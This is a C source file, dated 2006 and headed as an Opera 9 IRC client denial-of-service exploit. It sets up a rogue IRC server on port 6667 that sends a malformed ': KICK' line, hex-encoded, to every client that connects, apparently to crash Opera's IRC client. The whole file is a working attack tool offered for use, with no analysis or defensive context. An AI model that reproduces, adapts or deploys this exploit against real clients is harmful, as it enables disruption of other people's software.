/* 
 * Opera 9 IRC client DOS exploit
 * by Preddy and NNP
 *
 * http://www.smashthestack.org
 * http://silenthack.co.uk
 * http://www.team-rootshell.com
 *
 * 12 August 2006
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>

#define MYPORT 6667    

#define BACKLOG 10     

// : KICK\r\n

char die[] = {
    0x3a, 0x20, 0x4b, 0x49, 0x43, 0x4b, 0x0d, 0x0a, 0x00 };

void sigchld_handler(int s)
{
    while(waitpid(-1, NULL, WNOHANG) > 0);
}

int main(void)
{
    int sockfd, new_fd;  
    struct sockaddr_in my_addr;    
    struct sockaddr_in their_addr; 
    socklen_t sin_size;
    struct sigaction sa;
    int yes=1;

    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }

    if (setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(int)) == -1) {
        perror("setsockopt");
        exit(1);
    }
    
    my_addr.sin_family = AF_INET;         
    my_addr.sin_port = htons(MYPORT);
    my_addr.sin_addr.s_addr = INADDR_ANY; 
    memset(&(my_addr.sin_zero), '\0', 8);

    if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr))
                                                                   == -1) {
        perror("bind");
        exit(1);
    }

    if (listen(sockfd, BACKLOG) == -1) {
        perror("listen");
        exit(1);
    }

    sa.sa_handler = sigchld_handler; // reap all dead processes
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction");
        exit(1);
    }

    while(1) {  // main accept() loop
        sin_size = sizeof(struct sockaddr_in);
        if ((new_fd = accept(sockfd, (struct sockaddr *)&their_addr,
                                                       &sin_size)) == -1) {
            perror("accept");
            continue;
        }
        printf("server: got connection from %s\n",
                                           inet_ntoa(their_addr.sin_addr));
        if (!fork()) { // this is the child process
	    int sentBytes = 0;
            close(sockfd); // child doesn't need the listener
            if ((sentBytes = send(new_fd, die, sizeof(die), 0)) == -1)
                perror("send");
	    printf("sent %d bytes\n", sentBytes);
	    sentBytes = 0;
            close(new_fd);
            exit(0);
        }
        close(new_fd);  // parent doesn't need this
    }

    return 0;
} 

